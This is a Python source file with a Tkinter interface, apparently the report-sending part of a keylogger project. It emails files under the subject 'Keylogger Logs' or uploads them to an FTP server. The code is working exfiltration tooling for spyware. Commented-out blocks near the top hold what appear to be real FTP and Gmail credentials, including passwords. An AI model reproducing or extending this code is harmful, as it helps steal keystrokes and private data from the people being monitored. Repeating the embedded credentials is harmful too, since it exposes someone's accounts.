import os
import ftplib
import smtplib
import threading
import tkinter as tk
from tkinter import ttk
from email.utils import COMMASPACE, formatdate
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.application import MIMEApplication

'''
server = 'files.000webhost.com'
port = 21
username = 'unwatery-flights'
password = 'Tatdat0922?'
server_path = 'public_html'
'''
'''
server = 'smtp.gmail.com'
port = 587
receiver = 'letrungcaotung@gmail.com'
sender = 'oceannamedomain@gmail.com'
password = 'Tatdat0922'
'''

files = ['standalone/emailftp.py', 'standalone/log.py', 'standalone/setting.py',]

class Tools(object):
    def send_email(self, server, port,
                   sender, password, receiver,
                   subject, body, files):
        try:
            session = smtplib.SMTP(server, port)        
            session.ehlo()
            session.starttls()
            session.ehlo()
            session.login(sender, password)
            session = session
            msg = MIMEMultipart()
            msg['From'] = sender
            msg['To'] = receiver
            msg['Date'] = formatdate(localtime=True)
            msg['Subject'] = subject
            msg.attach(MIMEText(body))
            for file in files:
                f = open(file, "rb")
                part = MIMEApplication(f.read(), Name=os.path.basename(file))
                part['Content-Disposition'] = 'attachment; filename="%s"' % os.path.basename(file)
                msg.attach(part)
            session.sendmail(sender, receiver, msg.as_string())
            return True
        except:
            return False
                        
    def upload_ftp(self, server, port,
                   username, password,
                   files, server_path):
        try:
            for file in files:
                #print(file)
                ftp = ftplib.FTP()
                ftp.connect(server, port)
                ftp.login(username, password)
                ftp.cwd(server_path)
                f = open(file, 'rb')
                ftp.storbinary('STOR ' + os.path.basename(file), f)
                f.close()
                ftp.close()
            return True
        except Exception as e:
            #print(e)
            return False

class Email(object):
    def __init__(self, root):
        self.root = root
        self.render()

    def render(self):
        def send_mail():
            def run():
                subject = 'Keylogger Logs' #add date
                body = ''
                status = Tools().send_email(server, port, sender, password, receiver, subject, body, files)
                if status:
                    self.msg.config(state='normal')
                    self.msg.config(fg='green')
                    self.msg.delete(0, tk.END)
                    self.msg.insert(0, 'Success!')
                    self.msg.config(state='readonly')
                else:
                    self.msg.config(state='normal')
                    self.msg.config(fg='red')
                    self.msg.delete(0, tk.END)
                    self.msg.insert(0, 'Failed!')
                    self.msg.config(state='readonly')

            server = str(self.text_field_4.get())
            port = int(self.text_field_5.get())
            sender = str(self.text_field_1.get())
            password = str(self.text_field_2.get())
            receiver = str(self.text_field_3.get())
            self.msg.config(state='normal') #update status bar
            self.msg.config(fg='black')
            self.msg.delete(0, tk.END)
            self.msg.insert(0, 'Sending...')
            self.msg.config(state='readonly')
            threading.Thread(target=run).start() #start sending email

        tk.Label(self.root, text='Sender Email').grid(row=1, column=1)
        tk.Label(self.root, text='Sender Password').grid(row=2, column=1)
        tk.Label(self.root, text='Receiver Email').grid(row=3, column=1)
        tk.Label(self.root, text='SMTP Server').grid(row=1, column=3)
        tk.Label(self.root, text='Port').grid(row=2, column=3)
        
        self.text_field_1 = tk.Entry(self.root, width=30) #sender
        self.text_field_2 = tk.Entry(self.root, width=30, show="*") #password
        self.text_field_3 = tk.Entry(self.root, width=30) #receiver
        self.text_field_4 = tk.Entry(self.root, width=30) #server
        self.text_field_5 = tk.Entry(self.root, width=30) #port
        self.text_field_1.grid(row=1, column=2)
        self.text_field_2.grid(row=2, column=2)
        self.text_field_3.grid(row=3, column=2)
        self.text_field_4.grid(row=1, column=4)
        self.text_field_5.grid(row=2, column=4)
        
        self.text_field_4.insert(0, 'smtp.gmail.com')
        self.text_field_5.insert(0, 587)

        
        self.msg = tk.Entry(self.root, justify='center')
        self.msg.grid(row=4, column=1, columnspan=4, sticky='news')
        self.msg.config(state='readonly')

        tk.Button(self.root, text='SEND', command=send_mail).grid(row=5, column=1, columnspan=4, sticky='news')


class FTP(object):
    def __init__(self, root):
        self.root = root
        self.render()

    def render(self):
        def upload_ftp():
            def run():
                status = Tools().upload_ftp(server, port, username, password, files, server_path)
                if status:
                    self.msg.config(state='normal')
                    self.msg.config(fg='green')
                    self.msg.delete(0, tk.END)
                    self.msg.insert(0, 'Success!')
                    self.msg.config(state='readonly')
                else:
                    self.msg.config(state='normal')
                    self.msg.config(fg='red')
                    self.msg.delete(0, tk.END)
                    self.msg.insert(0, 'Failed!')
                    self.msg.config(state='readonly')

            server = str(self.text_field_4.get())
            port = int(self.text_field_5.get())
            username = str(self.text_field_1.get())
            password = str(self.text_field_2.get())
            server_path = str(self.text_field_3.get())
            self.msg.config(state='normal') #update status bar
            self.msg.config(fg='black')
            self.msg.delete(0, tk.END)
            self.msg.insert(0, 'Sending...')
            self.msg.config(state='readonly')
            threading.Thread(target=run).start() #start uploading

        tk.Label(self.root, text='Username').grid(row=1, column=1)
        tk.Label(self.root, text='Password').grid(row=2, column=1)
        tk.Label(self.root, text='Server Folder').grid(row=3, column=1)
        tk.Label(self.root, text='FTP Server').grid(row=1, column=3)
        tk.Label(self.root, text='Port').grid(row=2, column=3)
        
        self.text_field_1 = tk.Entry(self.root, width=32) #sender
        self.text_field_2 = tk.Entry(self.root, width=32, show="*") #password
        self.text_field_3 = tk.Entry(self.root, width=32) #receiver
        self.text_field_4 = tk.Entry(self.root, width=33) #server
        self.text_field_5 = tk.Entry(self.root, width=33) #port
        self.text_field_1.grid(row=1, column=2)
        self.text_field_2.grid(row=2, column=2)
        self.text_field_3.grid(row=3, column=2)
        self.text_field_4.grid(row=1, column=4)
        self.text_field_5.grid(row=2, column=4)

        self.text_field_5.insert(0, 21)
        
        self.msg = tk.Entry(self.root, justify='center')
        self.msg.grid(row=4, column=1, columnspan=4, sticky='news')
        self.msg.config(state='readonly')

        tk.Button(self.root, text='SEND', command=upload_ftp).grid(row=5, column=1, columnspan=4, sticky='news')

class SendReport(object):
    def __init__(self, root):
        tab_control = ttk.Notebook(root)

        tab_1 = ttk.Frame(tab_control)
        tab_2 = ttk.Frame(tab_control)

        Email(tab_1)
        FTP(tab_2)

        tab_control.add(tab_1, text='Email')
        tab_control.add(tab_2, text='FTP')
        tab_control.grid()

